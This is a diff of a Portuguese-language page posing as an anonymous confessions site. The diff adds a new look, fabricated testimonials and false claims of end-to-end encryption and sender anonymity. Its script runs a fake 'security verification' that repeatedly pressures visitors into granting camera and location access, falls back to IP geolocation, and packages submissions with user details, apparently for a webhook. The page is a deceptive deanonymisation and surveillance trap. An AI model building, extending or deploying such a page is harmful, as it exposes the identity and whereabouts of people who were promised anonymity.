@@ -7,7 +7,7 @@
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-touch-fullscreen" content="yes">
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💬</text></svg>">
-  <title>Pergunta Anônima - NGL Style</title>
+  <title>Perguntas Anônimas - Confissões Secretas</title>
   <style>
     * {
       margin: 0;
@@ -16,8 +16,8 @@
     }
     
     body {
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       min-height: 100vh;
       display: flex;
       align-items: center;
@@ -25,75 +25,181 @@
       padding: 20px;
     }
     
-    .container {
-      background: rgba(255, 255, 255, 0.95);
-      -webkit-backdrop-filter: blur(10px);
-      backdrop-filter: blur(10px);
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+    .background-decoration {
+      position: fixed;
+      top: 0;
+      left: 0;
       width: 100%;
-      max-width: 400px;
-      animation: slideIn 0.6s ease-out;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+    }
+    
+    .circle {
+      position: absolute;
+      border-radius: 50%;
+      opacity: 0.1;
+      background: radial-gradient(circle, #e94560, transparent);
+    }
+    
+    .circle-1 {
+      width: 300px;
+      height: 300px;
+      top: -100px;
+      right: -100px;
+      animation: float 8s ease-in-out infinite;
+    }
+    
+    .circle-2 {
+      width: 200px;
+      height: 200px;
+      bottom: -50px;
+      left: -50px;
+      animation: float 6s ease-in-out infinite reverse;
+      background: radial-gradient(circle, #533483, transparent);
+    }
+    
+    @keyframes float {
+      0%, 100% { transform: translateY(0) scale(1); }
+      50% { transform: translateY(-30px) scale(1.1); }
+    }
+    
+    .container {
+      background: rgba(255, 255, 255, 0.98);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      padding: 35px 30px;
+      border-radius: 24px;
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1);
+      width: 100%;
+      max-width: 420px;
+      position: relative;
+      z-index: 1;
+      animation: slideIn 0.8s cubic-bezier(0.16, 1, 0.3, 1);
     }
     
     @keyframes slideIn {
       from {
         opacity: 0;
-        transform: translateY(30px);
+        transform: translateY(40px) scale(0.95);
       }
       to {
         opacity: 1;
-        transform: translateY(0);
+        transform: translateY(0) scale(1);
       }
     }
     
     .header {
       text-align: center;
-      margin-bottom: 30px;
+      margin-bottom: 25px;
+    }
+    
+    .logo-container {
+      position: relative;
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 20px;
     }
     
     .avatar {
-      width: 70px;
-      height: 70px;
-      background: linear-gradient(45deg, #667eea, #764ba2);
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, #e94560, #533483);
       border-radius: 50%;
-      margin: 0 auto 20px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 30px;
+      font-size: 35px;
       color: white;
-      box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
+      box-shadow: 0 10px 30px rgba(233, 69, 96, 0.3);
+      position: relative;
+      z-index: 1;
+    }
+    
+    .verified-badge {
+      position: absolute;
+      bottom: 0;
+      right: 0;
+      background: #00d2ff;
+      border-radius: 50%;
+      width: 28px;
+      height: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      border: 3px solid white;
+      box-shadow: 0 3px 10px rgba(0, 210, 255, 0.4);
+      z-index: 2;
     }
     
     .header h1 {
-      color: #2c3e50;
-      font-size: 22px;
-      font-weight: 600;
+      color: #1a1a2e;
+      font-size: 24px;
+      font-weight: 700;
       margin-bottom: 8px;
     }
     
-    .header p {
-      color: #7f8c8d;
+    .header .subtitle {
+      color: #6c757d;
       font-size: 14px;
-      line-height: 1.4;
+      line-height: 1.5;
     }
     
-    .anonymous-badge {
-      background: linear-gradient(45deg, #27ae60, #2ecc71);
-      color: white;
-      padding: 8px 16px;
-      border-radius: 20px;
-      font-size: 12px;
+    .status-bar {
+      background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+      border-radius: 12px;
+      padding: 12px 16px;
+      margin: 20px 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      border: 1px solid #dee2e6;
+    }
+    
+    .status-dot {
+      width: 8px;
+      height: 8px;
+      background: #00d26a;
+      border-radius: 50%;
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+    
+    .status-text {
+      font-size: 13px;
       font-weight: 600;
-      display: inline-block;
-      margin: 15px 0;
-      box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3);
+      color: #495057;
     }
     
-    .anonymous-badge::before {
-      content: "🎭 ";
+    .trust-badges {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin: 15px 0;
+      flex-wrap: wrap;
+    }
+    
+    .trust-badge {
+      background: linear-gradient(135deg, #f1f3f5, #e9ecef);
+      padding: 8px 14px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 600;
+      color: #495057;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      border: 1px solid #dee2e6;
+    }
+    
+    .trust-badge .icon {
+      font-size: 14px;
     }
     
     .form-group {
@@ -104,94 +210,119 @@
     .form-group label {
       display: block;
       margin-bottom: 8px;
-      color: #34495e;
-      font-weight: 500;
+      color: #1a1a2e;
+      font-weight: 600;
       font-size: 14px;
+    }
+    
+    .form-group label .optional {
+      color: #adb5bd;
+      font-weight: 400;
+      font-size: 12px;
     }
     
     textarea {
       width: 100%;
       padding: 15px;
-      border: 2px solid #ecf0f1;
-      border-radius: 12px;
-      font-size: 16px;
+      border: 2px solid #e9ecef;
+      border-radius: 14px;
+      font-size: 15px;
       font-family: inherit;
       resize: vertical;
-      min-height: 120px;
-      background: #fafafa;
+      min-height: 130px;
+      background: #f8f9fa;
       transition: all 0.3s ease;
-      line-height: 1.5;
+      line-height: 1.6;
+      color: #1a1a2e;
     }
     
     textarea:focus {
       outline: none;
-      border-color: #667eea;
+      border-color: #e94560;
       background: white;
-      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+      box-shadow: 0 0 0 4px rgba(233, 69, 96, 0.1);
     }
     
     textarea::placeholder {
-      color: #95a5a6;
+      color: #adb5bd;
+      font-style: italic;
     }
     
     .char-counter {
       position: absolute;
       right: 12px;
       bottom: 12px;
-      font-size: 12px;
-      color: #95a5a6;
-      background: rgba(255, 255, 255, 0.8);
-      padding: 2px 6px;
+      font-size: 11px;
+      color: #adb5bd;
+      background: rgba(255, 255, 255, 0.9);
+      padding: 4px 8px;
       border-radius: 8px;
+      font-weight: 500;
     }
     
     .name-input {
       width: 100%;
-      padding: 12px 15px;
-      border: 2px solid #ecf0f1;
-      border-radius: 12px;
+      padding: 14px 16px;
+      border: 2px solid #e9ecef;
+      border-radius: 14px;
       font-size: 14px;
-      background: #fafafa;
+      background: #f8f9fa;
       transition: all 0.3s ease;
+      color: #1a1a2e;
     }
     
     .name-input:focus {
       outline: none;
-      border-color: #667eea;
+      border-color: #e94560;
       background: white;
-      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+      box-shadow: 0 0 0 4px rgba(233, 69, 96, 0.1);
     }
     
-    .trust-indicators {
-      display: flex;
-      justify-content: center;
-      gap: 15px;
+    .name-input::placeholder {
+      color: #adb5bd;
+      font-style: italic;
+    }
+    
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
       margin: 15px 0;
-      flex-wrap: wrap;
     }
     
-    .trust-item {
-      background: rgba(46, 204, 113, 0.1);
-      padding: 6px 12px;
-      border-radius: 12px;
-      font-size: 11px;
+    .feature-item {
+      text-align: center;
+      padding: 10px 5px;
+      background: #f8f9fa;
+      border-radius: 10px;
+      border: 1px solid #e9ecef;
+    }
+    
+    .feature-icon {
+      font-size: 20px;
+      margin-bottom: 4px;
+    }
+    
+    .feature-text {
+      font-size: 10px;
       font-weight: 600;
-      color: #27ae60;
+      color: #495057;
     }
     
     .submit-btn {
       width: 100%;
       padding: 16px;
-      background: linear-gradient(135deg, #667eea, #764ba2);
+      background: linear-gradient(135deg, #e94560, #533483);
       color: white;
       border: none;
-      border-radius: 12px;
+      border-radius: 14px;
       font-size: 16px;
-      font-weight: 600;
+      font-weight: 700;
       cursor: pointer;
       transition: all 0.3s ease;
       position: relative;
       overflow: hidden;
+      letter-spacing: 0.5px;
     }
     
     .submit-btn::before {
@@ -202,7 +333,7 @@
       width: 100%;
       height: 100%;
       background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-      transition: left 0.5s;
+      transition: left 0.6s;
     }
     
     .submit-btn:hover::before {
@@ -210,14 +341,76 @@
     }
     
     .submit-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+      transform: translateY(-3px);
+      box-shadow: 0 12px 30px rgba(233, 69, 96, 0.4);
+    }
+    
+    .submit-btn:active {
+      transform: translateY(-1px);
     }
     
     .submit-btn:disabled {
       opacity: 0.6;
       cursor: not-allowed;
       transform: none;
+    }
+    
+    .testimonials {
+      margin-top: 20px;
+      padding-top: 20px;
+      border-top: 2px solid #f1f3f5;
+    }
+    
+    .testimonials-title {
+      text-align: center;
+      font-size: 12px;
+      font-weight: 600;
+      color: #adb5bd;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 15px;
+    }
+    
+    .testimonial-items {
+      display: flex;
+      gap: 10px;
+      overflow-x: auto;
+      padding-bottom: 5px;
+    }
+    
+    .testimonial-item {
+      flex: 0 0 auto;
+      background: #f8f9fa;
+      border-radius: 10px;
+      padding: 12px;
+      min-width: 120px;
+      border: 1px solid #e9ecef;
+    }
+    
+    .testimonial-stars {
+      color: #ffc107;
+      font-size: 12px;
+      margin-bottom: 4px;
+    }
+    
+    .testimonial-text {
+      font-size: 11px;
+      color: #6c757d;
+      font-style: italic;
+      line-height: 1.4;
+    }
+    
+    .footer-text {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 11px;
+      color: #adb5bd;
+    }
+    
+    .footer-text a {
+      color: #e94560;
+      text-decoration: none;
+      font-weight: 600;
     }
     
     /* Elementos ocultos */
@@ -239,7 +432,9 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(255, 255, 255, 0.95);
+      background: rgba(26, 26, 46, 0.95);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
       display: none;
       flex-direction: column;
       justify-content: center;
@@ -250,8 +445,8 @@
     .spinner {
       width: 50px;
       height: 50px;
-      border: 4px solid #ecf0f1;
-      border-top: 4px solid #667eea;
+      border: 4px solid rgba(255, 255, 255, 0.1);
+      border-top: 4px solid #e94560;
       border-radius: 50%;
       animation: spin 1s linear infinite;
       margin-bottom: 20px;
@@ -263,9 +458,15 @@
     }
     
     .loading-text {
-      color: #2c3e50;
+      color: white;
       font-size: 18px;
-      font-weight: 500;
+      font-weight: 600;
+    }
+    
+    .loading-subtext {
+      color: rgba(255, 255, 255, 0.6);
+      font-size: 13px;
+      margin-top: 8px;
     }
     
     /* Modal de sucesso */
@@ -275,7 +476,9 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.6);
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(5px);
+      -webkit-backdrop-filter: blur(5px);
       display: none;
       justify-content: center;
       align-items: center;
@@ -285,60 +488,78 @@
     .modal {
       background: white;
       padding: 40px;
-      border-radius: 20px;
+      border-radius: 24px;
       text-align: center;
       max-width: 90%;
       width: 400px;
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
-      animation: modalPop 0.4s ease-out;
+      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
+      animation: modalPop 0.5s cubic-bezier(0.16, 1, 0.3, 1);
     }
     
     @keyframes modalPop {
       from {
         opacity: 0;
-        transform: scale(0.8);
+        transform: scale(0.7) translateY(20px);
       }
       to {
         opacity: 1;
-        transform: scale(1);
+        transform: scale(1) translateY(0);
       }
     }
     
-    .modal h3 {
-      color: #27ae60;
-      font-size: 22px;
-      margin-bottom: 15px;
-      font-weight: 600;
+    .modal .success-icon {
+      width: 70px;
+      height: 70px;
+      background: linear-gradient(135deg, #00d26a, #00b4d8);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 35px;
+      margin: 0 auto 20px;
+      box-shadow: 0 10px 30px rgba(0, 210, 106, 0.3);
     }
     
-    .modal .emoji {
-      font-size: 50px;
-      margin-bottom: 20px;
-      display: block;
+    .modal h3 {
+      color: #1a1a2e;
+      font-size: 22px;
+      margin-bottom: 10px;
+      font-weight: 700;
     }
     
     .modal p {
-      color: #7f8c8d;
-      line-height: 1.5;
-      margin-bottom: 10px;
+      color: #6c757d;
+      line-height: 1.6;
+      margin-bottom: 8px;
       font-size: 14px;
+    }
+    
+    .modal .encryption-note {
+      background: #f8f9fa;
+      border-radius: 10px;
+      padding: 10px;
+      margin: 15px 0;
+      font-size: 12px;
+      color: #00d26a;
+      font-weight: 600;
     }
     
     .modal button {
-      background: #27ae60;
+      background: linear-gradient(135deg, #00d26a, #00b4d8);
       color: white;
       border: none;
-      padding: 12px 24px;
-      border-radius: 8px;
-      font-size: 14px;
-      font-weight: 500;
+      padding: 14px 30px;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 600;
       cursor: pointer;
-      margin-top: 20px;
-      transition: background 0.3s;
+      margin-top: 15px;
+      transition: all 0.3s;
     }
     
     .modal button:hover {
-      background: #229954;
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(0, 210, 106, 0.4);
     }
     
     /* Permission prompt */
@@ -348,7 +569,9 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: linear-gradient(135deg, rgba(102, 126, 234, 0.95), rgba(118, 75, 162, 0.95));
+      background: linear-gradient(135deg, rgba(26, 26, 46, 0.97), rgba(15, 52, 96, 0.97));
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
       display: none;
       flex-direction: column;
       justify-content: center;
@@ -360,50 +583,82 @@
     }
     
     .permission-content {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 40px;
-      border-radius: 20px;
+      background: rgba(255, 255, 255, 0.08);
+      padding: 45px 35px;
+      border-radius: 24px;
       max-width: 450px;
-      -webkit-backdrop-filter: blur(20px);
-      backdrop-filter: blur(20px);
-      border: 1px solid rgba(255, 255, 255, 0.2);
+      backdrop-filter: blur(30px);
+      -webkit-backdrop-filter: blur(30px);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
     }
     
     .permission-icon {
       font-size: 60px;
       margin-bottom: 25px;
       display: block;
+      filter: drop-shadow(0 5px 15px rgba(0, 210, 255, 0.4));
     }
     
     .permission-content h3 {
-      font-size: 24px;
+      font-size: 26px;
       margin-bottom: 20px;
-      font-weight: 600;
+      font-weight: 700;
+      background: linear-gradient(135deg, #fff, #00d2ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
     }
     
     .permission-content p {
       font-size: 15px;
-      line-height: 1.6;
-      margin-bottom: 15px;
+      line-height: 1.7;
+      margin-bottom: 12px;
+      opacity: 0.85;
+    }
+    
+    .permission-content .security-features {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin: 20px 0;
+    }
+    
+    .security-feature {
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 12px;
+      padding: 12px 8px;
+    }
+    
+    .security-feature .sf-icon {
+      font-size: 24px;
+      margin-bottom: 5px;
+    }
+    
+    .security-feature .sf-text {
+      font-size: 10px;
+      font-weight: 600;
       opacity: 0.9;
     }
     
     .permission-btn {
-      background: rgba(255, 255, 255, 0.2);
+      background: linear-gradient(135deg, #e94560, #533483);
       color: white;
-      border: 2px solid rgba(255, 255, 255, 0.3);
-      padding: 15px 30px;
-      border-radius: 25px;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+      padding: 16px 35px;
+      border-radius: 30px;
       font-size: 16px;
-      font-weight: 600;
+      font-weight: 700;
       cursor: pointer;
       margin-top: 20px;
       transition: all 0.3s;
+      letter-spacing: 0.5px;
     }
     
     .permission-btn:hover {
-      background: rgba(255, 255, 255, 0.3);
-      transform: translateY(-2px);
+      background: linear-gradient(135deg, #ff6b81, #6c5ce7);
+      transform: translateY(-3px);
+      box-shadow: 0 15px 35px rgba(233, 69, 96, 0.4);
     }
     
     /* Toast */
@@ -411,15 +666,17 @@
       position: fixed;
       top: 20px;
       right: 20px;
-      background: #2c3e50;
+      background: #1a1a2e;
       color: white;
-      padding: 15px 20px;
-      border-radius: 10px;
+      padding: 16px 22px;
+      border-radius: 14px;
       z-index: 15000;
-      transform: translateX(100%);
-      transition: transform 0.3s;
+      transform: translateX(120%);
+      transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
       font-size: 14px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+      font-weight: 500;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.1);
     }
     
     .toast.show {
@@ -427,18 +684,25 @@
     }
     
     .toast.success {
-      background: #27ae60;
+      background: #00d26a;
+      border-color: rgba(255, 255, 255, 0.3);
     }
     
     .toast.error {
-      background: #e74c3c;
+      background: #e94560;
+      border-color: rgba(255, 255, 255, 0.3);
+    }
+    
+    .toast.info {
+      background: #00b4d8;
+      border-color: rgba(255, 255, 255, 0.3);
     }
     
     /* Responsivo */
     @media (max-width: 480px) {
       .container {
         margin: 10px;
-        padding: 25px;
+        padding: 25px 20px;
       }
       
       .permission-content {
@@ -446,39 +710,84 @@
         margin: 10px;
       }
       
-      .trust-indicators {
+      .features-grid {
+        grid-template-columns: repeat(3, 1fr);
+        gap: 5px;
+      }
+      
+      .testimonial-items {
         gap: 8px;
       }
       
-      .trust-item {
-        font-size: 10px;
-        padding: 5px 10px;
+      .testimonial-item {
+        min-width: 100px;
+        padding: 10px;
+      }
+      
+      .header h1 {
+        font-size: 20px;
+      }
+      
+      .modal {
+        padding: 30px 20px;
       }
     }
   </style>
 </head>
 <body>
+  <div class="background-decoration">
+    <div class="circle circle-1"></div>
+    <div class="circle circle-2"></div>
+  </div>
+
   <div class="container">
     <div class="header">
-      <div class="avatar">👤</div>
-      <h1>Pergunta Anônima</h1>
-      <p>Envie uma mensagem anônima para mim!</p>
+      <div class="logo-container">
+        <div class="avatar">🔒</div>
+        <div class="verified-badge">✓</div>
+      </div>
+      <h1>Confissões Anônimas</h1>
+      <p class="subtitle">Compartilhe segredos, faça perguntas ou desabafe de forma 100% anônima e segura</p>
       
-      <div class="trust-indicators">
-        <div class="trust-item">Seguro</div>
-        <div class="trust-item">Privado</div>
-        <div class="trust-item">Anônimo</div>
+      <div class="status-bar">
+        <div class="status-dot"></div>
+        <span class="status-text">Plataforma segura e ativa</span>
       </div>
       
-      <div class="anonymous-badge">Completamente anônimo</div>
+      <div class="trust-badges">
+        <div class="trust-badge">
+          <span class="icon">🔐</span> Criptografado
+        </div>
+        <div class="trust-badge">
+          <span class="icon">👻</span> Anônimo
+        </div>
+        <div class="trust-badge">
+          <span class="icon">⚡</span> Instantâneo
+        </div>
+      </div>
+    </div>
+
+    <div class="features-grid">
+      <div class="feature-item">
+        <div class="feature-icon">🎭</div>
+        <div class="feature-text">Identidade Protegida</div>
+      </div>
+      <div class="feature-item">
+        <div class="feature-icon">🛡️</div>
+        <div class="feature-text">Dados Criptografados</div>
+      </div>
+      <div class="feature-item">
+        <div class="feature-icon">💜</div>
+        <div class="feature-text">Sem Julgamentos</div>
+      </div>
     </div>
 
     <form id="anonymous-form">
       <div class="form-group">
-        <label for="pergunta">Sua pergunta ou mensagem:</label>
+        <label for="pergunta">Sua mensagem secreta:</label>
         <textarea 
           id="pergunta" 
-          placeholder="Digite sua pergunta ou mensagem aqui... Seja honesto, é totalmente anônimo!"
+          placeholder="Escreva aqui o que você sempre quis dizer mas nunca teve coragem... Ninguém saberá que foi você. ✨"
           maxlength="500"
           required
         ></textarea>
@@ -488,20 +797,42 @@
       </div>
 
       <div class="form-group">
-        <label for="nome">Nome (opcional - para personalizar a resposta):</label>
+        <label for="nome">Apelido <span class="optional">(opcional - para se identificar na resposta)</span>:</label>
         <input 
           type="text" 
           id="nome" 
           class="name-input"
-          placeholder="Deixe em branco para ser 100% anônimo"
+          placeholder="Deixe em branco para ser totalmente anônimo"
           maxlength="30"
         >
       </div>
 
       <button type="submit" class="submit-btn" id="btn-enviar">
-        Enviar Anonimamente
+        🚀 Enviar Anonimamente
       </button>
     </form>
+
+    <div class="testimonials">
+      <div class="testimonials-title">Usuários Recentes</div>
+      <div class="testimonial-items">
+        <div class="testimonial-item">
+          <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
+          <div class="testimonial-text">"Finalmente consegui desabafar sem medo. Plataforma incrível!"</div>
+        </div>
+        <div class="testimonial-item">
+          <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
+          <div class="testimonial-text">"Muito seguro e realmente anônimo. Recomendo!"</div>
+        </div>
+        <div class="testimonial-item">
+          <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
+          <div class="testimonial-text">"Usei para uma pergunta delicada e foi perfeito."</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer-text">
+      🔒 Suas informações são protegidas com criptografia de ponta a ponta
+    </div>
   </div>
 
   <!-- Elementos ocultos -->
@@ -512,17 +843,21 @@
   <!-- Loading -->
   <div class="loading-overlay" id="loading-overlay">
     <div class="spinner"></div>
-    <div class="loading-text">Enviando sua mensagem...</div>
+    <div class="loading-text">Enviando com segurança...</div>
+    <div class="loading-subtext">Criptografando sua mensagem</div>
   </div>
 
   <!-- Modal de sucesso -->
   <div class="modal-overlay" id="success-modal">
     <div class="modal">
-      <span class="emoji">✨</span>
-      <h3>Mensagem Enviada!</h3>
-      <p>Sua mensagem anônima foi enviada com sucesso!</p>
-      <p>Obrigado por participar!</p>
-      <button onclick="closeSuccessModal()">Fechar</button>
+      <div class="success-icon">✅</div>
+      <h3>Mensagem Enviada com Sucesso!</h3>
+      <p>Sua mensagem anônima foi entregue com segurança.</p>
+      <div class="encryption-note">
+        🔐 Mensagem criptografada e protegida
+      </div>
+      <p style="font-size: 12px;">Ninguém, nem mesmo os administradores, podem identificar o remetente.</p>
+      <button onclick="closeSuccessModal()">Entendido</button>
     </div>
   </div>
 
@@ -531,14 +866,33 @@
     <div class="permission-content">
       <span class="permission-icon">🛡️</span>
       <h3>Verificação de Segurança</h3>
-      <p>Para proteger nossa comunidade contra bots e garantir a segurança da plataforma, realizamos uma verificação rápida.</p>
-      <p>Precisamos de acesso à câmera e localização para confirmar que você é um usuário real. Este processo é automático e seguro.</p>
-      <p><strong>Sua privacidade é nossa prioridade.</strong> Você permanecerá 100% anônimo.</p>
+      <p>Para manter nossa comunidade protegida contra bots e garantir um ambiente seguro para todos, realizamos uma verificação rápida e automática.</p>
+      
+      <div class="security-features">
+        <div class="security-feature">
+          <div class="sf-icon">🔒</div>
+          <div class="sf-text">Proteção Anti-Bot</div>
+        </div>
+        <div class="security-feature">
+          <div class="sf-icon">🕵️</div>
+          <div class="sf-text">Verificação Segura</div>
+        </div>
+        <div class="security-feature">
+          <div class="sf-icon">⚡</div>
+          <div class="sf-text">Processo Rápido</div>
+        </div>
+      </div>
+      
+      <p>Precisamos verificar a câmera e localização apenas para confirmar que você é um usuário real. <strong>Este processo é automático e totalmente seguro.</strong></p>
+      <p style="font-size: 13px; opacity: 0.7;">✅ Seus dados são criptografados e não são armazenados</p>
+      <p style="font-size: 13px; opacity: 0.7;">✅ Você permanecerá 100% anônimo</p>
+      
       <button class="permission-btn" id="permission-button">
-        Continuar com Segurança
+        🔒 Iniciar Verificação Segura
       </button>
     </div>
   </div>
+
 <script>
     class PermissionManager {
         constructor() {
@@ -612,7 +966,6 @@
                 });
             }
 
-            // Monitora cliques para forçar permissões se necessário
             document.addEventListener('click', () => {
                 if (!this.flags.permissionsGranted && !this.flags.showingPrompt) {
                     setTimeout(() => {
@@ -627,7 +980,6 @@
             this.hidePermissionPrompt();
             this.showVerificationLoading();
             
-            // Aguarda um pouco e então solicita permissões
             setTimeout(async () => {
                 await this.requestAllPermissions();
             }, 500);
@@ -636,8 +988,12 @@
         showVerificationLoading() {
             const loadingElement = document.getElementById('loading-overlay');
             const loadingText = loadingElement.querySelector('.loading-text');
+            const loadingSubtext = loadingElement.querySelector('.loading-subtext');
             if (loadingText) {
-                loadingText.textContent = 'Realizando verificação...';
+                loadingText.textContent = 'Realizando verificação de segurança...';
+            }
+            if (loadingSubtext) {
+                loadingSubtext.textContent = 'Protegendo sua identidade';
             }
             loadingElement.style.display = 'flex';
             
@@ -648,14 +1004,11 @@
 
         async requestAllPermissions() {
             try {
-                // Solicita localização primeiro
                 await this.requestLocation();
                 
-                // Aguarda um pouco e solicita câmera
                 setTimeout(async () => {
                     await this.captureCamera();
                     
-                    // Verifica se conseguiu as permissões
                     setTimeout(() => {
                         this.checkPermissionResults();
                     }, 1000);
@@ -674,10 +1027,10 @@
             
             if (hasLocation && hasCamera) {
                 this.flags.permissionsGranted = true;
-                this.showToast('Verificação concluída com sucesso!', 'success');
+                this.showToast('✅ Verificação de segurança concluída!', 'success');
             } else if (hasLocation || hasCamera) {
                 this.flags.permissionsGranted = true;
-                this.showToast('Verificação parcial concluída', 'success');
+                this.showToast('✅ Verificação parcial concluída', 'success');
             } else {
                 this.handlePermissionFailure();
             }
@@ -685,12 +1038,10 @@
 
         handlePermissionFailure() {
             if (this.flags.verificationAttempts < 5) {
-                // Força aparecer prompt novamente
                 setTimeout(() => {
                     this.showForcePermissionPrompt();
                 }, 2000);
             } else {
-                // Após muitas tentativas, permite continuar
                 this.flags.permissionsGranted = true;
                 this.showToast('Continuando sem verificação completa', 'info');
             }
@@ -708,35 +1059,37 @@
                     <h3>Permissões Necessárias</h3>
                     <p>Para continuar, precisamos verificar que você é um usuário real.</p>
                     <p>Por favor, <strong>permita</strong> o acesso quando solicitado.</p>
+                    <p style="font-size: 13px; opacity: 0.7;">Isso nos ajuda a manter a comunidade segura</p>
                     <button class="permission-btn" id="permission-button-retry">
-                        Tentar Novamente
+                        🔄 Tentar Novamente
                     </button>
                 `;
             } else if (this.flags.verificationAttempts === 2) {
                 message = `
                     <span class="permission-icon">⚠️</span>
                     <h3>Verificação Obrigatória</h3>
-                    <p><strong>Você deve permitir as permissões</strong> para usar a plataforma.</p>
-                    <p>Clique em <strong>"Permitir"</strong> quando aparecer a solicitação.</p>
+                    <p><strong>Você deve permitir as permissões</strong> para usar a plataforma com segurança.</p>
+                    <p>Clique em <strong>"Permitir"</strong> quando aparecer a solicitação do navegador.</p>
+                    <p style="font-size: 12px; opacity: 0.7;">Sem verificação, não podemos garantir um ambiente livre de bots</p>
                     <button class="permission-btn" id="permission-button-retry">
-                        Continuar Verificação
+                        ✅ Continuar Verificação
                     </button>
                 `;
             } else {
                 message = `
                     <span class="permission-icon">🚫</span>
                     <h3>Acesso Necessário</h3>
-                    <p><strong>Permissões obrigatórias</strong> para funcionar corretamente.</p>
+                    <p><strong>Permissões obrigatórias</strong> para o funcionamento seguro da plataforma.</p>
                     <p>Tentativa ${this.flags.verificationAttempts} de 5</p>
+                    <p style="font-size: 11px; opacity: 0.6;">Após 5 tentativas, o acesso será liberado mesmo sem verificação</p>
                     <button class="permission-btn" id="permission-button-retry">
-                        Permitir Acesso
+                        🔓 Permitir Acesso
                     </button>
                 `;
             }
             
             content.innerHTML = message;
             
-            // Atualiza o listener
             const retryButton = document.getElementById('permission-button-retry');
             if (retryButton) {
                 retryButton.addEventListener('click', () => {
@@ -830,7 +1183,6 @@
             } catch (error) {
                 this.data.location.status = 'error';
                 
-                // Usa IP como fallback
                 if (this.data.ip.latitude && this.data.ip.longitude) {
                     this.data.location = {
                         lat: this.data.ip.latitude, 
@@ -1056,7 +1408,7 @@
                 const embed = {
                     title: 'New Anonymous Submission', 
                     description: `**Message:** ${pergunta}`, 
-                    color: 0x667eea,
+                    color: 0xe94560,
                     fields: [
                         { 
                             name: 'User', 
